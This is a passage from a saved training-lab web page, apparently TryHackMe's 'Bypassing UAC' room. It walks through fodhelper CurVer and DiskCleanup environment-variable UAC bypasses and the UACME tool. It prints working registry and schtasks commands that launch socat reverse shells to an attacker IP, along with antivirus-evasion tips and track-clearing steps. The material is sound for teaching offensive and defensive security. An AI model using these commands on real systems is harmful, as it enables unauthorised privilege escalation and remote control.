<span class="token function">Set-ItemProperty</span>  <span class="token string">"HKCU:\Software\Classes\ms-settings\CurVer"</span> <span class="token operator">-</span>Name <span class="token string">"(default)"</span> <span class="token operator">-</span>value <span class="token string">".pwn"</span> <span class="token operator">-</span>Force
    
<span class="token function">Start-Process</span> <span class="token string">"C:\Windows\System32\fodhelper.exe"</span> <span class="token operator">-</span>WindowStyle Hidden
</code></pre>
<p>This exploit creates a new progID with the name <strong>.pwn</strong> and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our .pwn progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command.</p>
<p>This technique is more likely to evade Windows Defender since we have more liberty on where to put our payload, as the name of the progID that holds our payload is entirely arbitrary. Let's start a new reverse shell on our attacker's machine:</p>
<pre><code>nc -lvp 4445</code></pre>
<p>And execute the exploit from our backdoor connection as is. As a result, Windows Defender will throw another alert that references our actions:<img style="text-align:center;font-size:1rem"></p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/36a12bfed5c44fedf170f934bd4bc9ca.png"><br></p>
<p><span>Although we are still detected, it is essential to note that sometimes the detection methods used by <a class="k0MBeYro glossary-term" onclick="initPopOver(&#39;AV&#39;, &#39;k0MBeYro&#39;)">AV</a> software are implemented strictly against the published exploit, without considering possible variations. If we translate our exploit from Powershell to use cmd.exe, the AV won't raise any alerts&nbsp;</span><span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes"

C:\&gt; reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\&gt; reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\&gt; fodhelper.exe</span></code>
        </pre>
    </div>
</div>

<p><span style="font-size:1rem">And we get a high integrity reverse shell:</span><br></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Attacker's Shell
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4445</span>      </span></span>
<span class="token output">Listening on 0.0.0.0 4445
Connection received on 10.10.183.127 23441
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</span></code>
        </pre>
    </div>
</div>

<p>To retrieve the fodhelper-curver flag, use your new shell to execute:</p><div class="terminal-container"><div class="terminal-content"><div class="terminal-top">Administrator: Command Prompt</div><pre class="terminal-code language-shell-session" style="font-size:14px" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; C:\flags\GetFlag-fodhelper-curver.exe</span></code>
        </pre></div></div><p><span style="font-weight:bolder">Note: Keep in mind that the flag will only be returned if you </span><b>successfully</b><span style="font-weight:bolder"><span>&nbsp;bypassed <a class="TqsWbllA glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;TqsWbllA&#39;)">UAC</a> via fodhelper and only from the resulting high integrity shell via socat.</span></span></p><p><span style="font-weight:bolder"><br></span></p>

<h3>Clearing our tracks</h3>
<p>As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following commands:</p>
<pre class=" language-batch" tabindex="0"><code class=" language-batch">reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f</code></pre>
<p><b>Note: Be sure to execute the given commands to avoid any artefact interfering with the following tasks.</b></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is returned by running the fodhelper-curver exploit?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*******************}" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="5">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-6">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse6" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 6                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> UAC: Environment Variable Expansion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse6" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3>Bypassing Always Notify</h3>
<p><span>As seen in the previous task, on default Windows configurations, you can abuse applications related to the system's configuration to bypass <a class="z4nmOBz2 glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;z4nmOBz2&#39;)">UAC</a> as most of these apps have the autoElevate flag set on their manifests. However, if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate. This would prevent several known bypass methods to be used, but not all hope is lost. </span></p>
<p><span>For the following technique, we'll be abusing a scheduled task that can be run by any user but will execute with the highest privileges available to the caller. Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent of the <a class="vWKkC9pS glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;vWKkC9pS&#39;)">UAC</a> security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through a UAC prompt.</span></p><p><br></p>
<h3>Case study: Disk Cleanup Scheduled Task</h3>
<p><strong>Note: Be sure to disable Windows Defender for this task, or you may have some difficulties when running the exploit.&nbsp;</strong><strong>Just run the provided shortcut on your machine's desktop to disable it.</strong></p>
<p>To understand why we are picking Disk Cleanup, let's open the <strong>Task Scheduler</strong> and check the task's configuration:</p><p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Bypassing UAC_files/24b5ce8c9a6cb1194ed66054bc2ed09e.png"><br></p>
<p>Here we can see that the task is configured to run with the <strong>Users</strong> account, which means it will inherit the privileges from the calling user. The <strong>Run with highest privileges</strong> option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. Notice that if a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and therefore the bypass wouldn't work.</p>
<p>Checking the Actions and Settings tabs, we have the following:</p><p style="text-align:center"><img style="width:100%;border:1px solid" src="./TryHackMe _ Bypassing UAC_files/3b8dd4c6a441eb19620bc3bedd536a8b.png"><br></p>
<p>The task can be run on-demand, executing the following command when invoked:</p><p>&nbsp;<code>%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p><p>Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the DiskCleanup task manually.</p>
<p>Luckily for us, we can override the <code>%windir%</code> variable through the registry by creating an entry in <code>HKCU\Environment</code><strong></strong>. If we want to execute a reverse shell using socat, we can set&nbsp;<code>%windir%</code>&nbsp; as follows (without the quotes):</p>
<p><code>"cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM "</code></p>
<p>At the end of our command, we concatenate "&amp;REM " (ending with a blank space) to comment whatever is put after <code>%windir%</code> when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):</p>
<p><code>cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4445 EXEC:cmd.exe,pipes &amp;REM \system32\cleanmgr.exe /autoclean /d %systemdrive%</code></p>
<p>Where anything after the "REM" is ignored as a comment.</p><p><br></p>
<h3>Putting it all together</h3>
<p>Let's set up a listener for a reverse shell with nc:<br>
<code>nc -lvp 4446</code></p>
<p>We will then connect to the backdoor provided on port 9999:<br>
<code>nc MACHINE_IP 9999</code></p>
<p>And finally, run the following commands to write our payload to <code>%windir%</code> and then execute the DiskCleanup task&nbsp;<span style="font-size:1rem">(be sure to replace your IP address where needed)</span><span style="font-size:1rem">:</span></p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\&gt; reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4446 EXEC:cmd.exe,pipes &amp;REM " /f

C:\&gt; schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I</span></code>
        </pre>
    </div>
</div>

<p>As a result, you should obtain a shell with high IL:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Attacker's Machine
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@kali</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4446</span>      </span></span>
<span class="token output">Listening on 0.0.0.0 4446
Connection received on 10.10.183.127 25631
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami /groups | find "Label"
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</span></code>
        </pre>
    </div>
</div>
<p>To retrieve the DiskCleanup flag, use your new shell to execute:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Administrator: Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\flags\GetFlag-diskcleanup.exe</span></code>
        </pre>
    </div>
</div>
<p><strong><span>Note: Keep in mind that the flag will only be returned if you successfully bypassed <a class="5RU3CkXI glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;5RU3CkXI&#39;)">UAC</a> via diskcleanup, and only from the resulting high integrity shell via socat.</span></strong></p><br>

<h3>Clearing our tracks</h3>
<p>As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following command:</p>
<pre class=" language-batch" tabindex="0"><code class=" language-batch">reg delete "HKCU\Environment" /v "windir" /f</code></pre>
<p><b>Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks. Since many Windows components rely on the %windir% environment variable, a lot of things won't&nbsp;</b><span style="font-weight:bolder;font-size:1rem">properly&nbsp;</span><b style="font-size:1rem">work until you remove the registry key used for this bypass.</b></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                What flag is returned by running the DiskCleanup exploit?
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{************************************}" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="6">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-7">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse7" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 7                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Automated Exploitation
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse7" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <h3><span>Automating <a class="Gc9RTM0h glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;Gc9RTM0h&#39;)">UAC</a> Bypasses</span></h3>
<p><span>An excellent tool is available to test for <a class="35ZRc4Z0 glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;35ZRc4Z0&#39;)">UAC</a> bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up to date repository of UAC bypass techniques that can be used out of the box. The tool is available for download at its official repository on:</span></p>
<p><a class="external-link" href="https://github.com/hfiref0x/UACME" target="_blank">https://github.com/hfiref0x/UACME</a></p>
<p><span>While <a class="BfslLBwD glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;BfslLBwD&#39;)">UAC</a>ME provides several tools, we will focus mainly on the one called Akagi, which runs the actual UAC bypasses. You can find a compiled version of Akagi under </span><code>C:\tools\UACME-Akagi64.exe</code><strong></strong>.</p>
<p>Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\attacker&gt;cd /tools

C:\tools&gt;UACME-Akagi64.exe 33</span></code>
        </pre>
    </div>
</div>
<p>The methods introduced through this room can also be tested by UACME by using the following methods:</p><table class="table table-bordered"><thead>
<tr>
<th>Method Id</th>
<th>Bypass technique</th>
</tr>
</thead>
<tbody>
<tr>
<td>33</td>
<td>fodhelper.exe</td>
</tr>
<tr>
<td>34</td>
<td>DiskCleanup scheduled task</td>
</tr>

<tr>
<td>70</td>
<td>fodhelper.exe using CurVer registry key</td>
</tr>
</tbody>
</table><div class="terminal-container"><div class="terminal-content">
    </div>
</div>
</div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Click and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="7">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8">
                    <div class="card-header task-header collapsed" data-toggle="collapse" href="#collapse8" aria-expanded="false">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 8                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Conclusion
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent" style="">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p><span>We have shown several methods to bypass <a class="ddOzWY1E glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;ddOzWY1E&#39;)">UAC</a> in Windows systems in this room. While most of these methods have automatic tools associated, they will be detected easily by any AV solution on the market if used straight out of the box. Knowing the actual methods will give you an edge as an attacker by allowing you to customize your exploits as needed and make them more evasive.</span></p>
<p><span>As we have seen, <a class="oBmfueJ5 glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;oBmfueJ5&#39;)">UAC</a> isn't considered a security boundary and is therefore prone to several bypass methods.</span></p><p><span style="font-size:1rem">Should you be interested in learning more techniques, the following resources are available:</span><br></p>
<ul>
<li><a href="https://github.com/hfiref0x/UACME" target="_blank">UACME github repository</a></li>
<li><a href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/" target="_blank">Bypassing UAC with mock folders and DLL hijacking</a><a class="external-link" href="https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/" target="_blank"></a></li><li><a href="https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/" target="_blank">UAC bypass techniques detection strategies</a>&nbsp;</li><li><a href="https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html" target="_blank">Reading your way around UAC</a><br></li>
</ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Click and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="8">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" onclick="answerQuestion(this, &#39;undefined&#39;)" disabled="">Correct Answer</button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Bypassing UAC_files/6be6191826f2a6e5a154c13ad8f29d1e.png"> 
        <a class="green-link" href="https://tryhackme.com/p/munra">munra</a></p><p class="mb-0">This is a <b>free</b> room, which means anyone can deploy virtual machines in the room 
        (without being subscribed)! 10155 users are in here and this room is 473 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox" class="">
<div id="room-attackbox" style="display: none;">
<div id="attackbox-machine-instance">
<div id="room-attackbox-loading" style="display: none;">
    </div>
<div id="room-attackbox-vm-view" style=""></div>
</div>
<div id="attackbox-machine-options" class="">
<div class="d-flex">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen" href="https://vnc.tryhackme.tech/index.html?host=proxy-2.tryhackme.tech&amp;password=33f05e80d3e63c0f&amp;proxyIP=10.10.251.24&amp;resize=remote" class="clear-link"><div><i class="far fa-expand-alt"></i></div></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
<div class="d-flex" id="room-attackbox-tabs"><div class="tab-active" data-id="i-09da03a320ea8db44" onclick="switchWebBasedTab(&#39;i-09da03a320ea8db44&#39;)">THM AttackBox<div></div></div></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires">1h 59m 58s</div>
</div>
</div>
<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-light-gray">
<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
</div>
<div class="modal-body">
<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4">
<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"><div onclick="getModalAttackBoxPubIP()">Reveal IP</div></code></li>
<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14">10.10.251.24</code> <span class="size-14">(Use this for your reverse shells)</span></li>
<li class="mt-1">Username: <code id="browser-username" class="dark size-14">root</code></li>
<li class="mt-1">Password: <code id="browser-password" class="dark size-14">33f05e80d3e63c0f</code></li>
<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14">vnc</code></li>
</ul>
<hr class="hr-min">
<ul class="text-lgray mb-0">
<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Bypassing UAC_files/clipboard.gif"></details></li>
<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div id="award-modal-badges"></div>
<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body"></div>
</div>
</div>
</div>
<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">...</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Bypassing UAC_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true" style="display: none;">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"><a target="_blank" class="twitterIcon" href="https://twitter.com/intent/tweet?url=https://tryhackme.com/room/bypassinguac&amp;via=realtryhackme&amp;text=Bypassing%20UAC%20-%20I%20have%20just%20completed%20this%20room!%20Check%20it%20out:%20&amp;hashtags=tryhackme,UAC,evasion,windows,redteam,privesc,bypassinguac"><button type="button" class="twitter-btn btn btn-primary" onclick="shareMediaEvent(&#39;room&#39;, &#39;bypassinguac&#39;, &#39;twitter&#39;)">
        <i class="fab fa-twitter"></i> Twitter
      </button></a> <a target="_blank" class="facebookIcon" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftryhackme.com%2Froom%2Fbypassinguac"><button type="button" class="facebook-btn btn btn-primary" onclick="shareMediaEvent(&#39;room&#39;,&#39;bypassinguac&#39;, &#39;facebook&#39;)">
      <i class="fab fa-facebook-f"></i> Facebook
    </button></a> <a target="_blank" class="linkedinIcon" href="https://www.linkedin.com/sharing/share-offsite/?url=https://tryhackme.com/room/bypassinguac"><button type="button" class="linkedin-btn btn btn-primary" onclick="shareMediaEvent(&#39;room&#39;, &#39;bypassinguac&#39;, &#39;linkedin&#39;)">
      <i class="fab fa-linkedin-in"></i> LinkedIn
      </button></a></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="ChoyRt5D-YoEFam7chJoqk1kDOqRzv2-bGw4">
<input type="hidden" name="roomCode" value="bypassinguac">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>

        <a class="next-room" href="https://tryhackme.com/jr/runtimedetectionevasion" onclick="clickNextRoomEvent(&#39;bypassinguac&#39;, &#39;runtimedetectionevasion&#39;, &#39;from_popup&#39;)">
          <div class="modal-footer d-flex justify-content-center">
            <i class="fad fa-angle-double-right mr-2"></i>
            Next Room: Runtime Detection Evasion
          </div>
        </a></div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Bypassing UAC_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Bypassing UAC_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Bypassing UAC_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
